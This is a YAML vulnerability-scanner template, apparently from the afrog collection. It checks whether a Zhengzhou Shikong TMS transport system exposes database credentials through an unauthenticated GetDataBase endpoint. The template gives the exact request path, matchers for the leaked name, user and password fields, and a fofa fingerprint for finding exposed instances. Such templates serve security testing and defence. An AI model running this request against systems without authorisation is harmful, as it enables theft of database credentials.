# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"dataname":'
          - '"datausername":'
          - '"datauserpwd":'
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/ManLogin/GetDataBase'
id: zzsk-wms-getdatabase-disclosure
info:
  author: zan8in
  description: |-
    郑州时空-TMS运输管理系统 GetDataBase 接口存在信息泄露漏洞，未经身份验证攻击者可通过该漏洞读取系统内部数据库文件，泄露账号密码等重要凭证，导致网站处于极度不安全状态。
    fofa: body="/Images/ManLogin/name.png"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 郑州时空-TMS运输管理系统 GetDataBase 信息泄露
  severity: high
  tags: zzsk,disclouse,argus-import
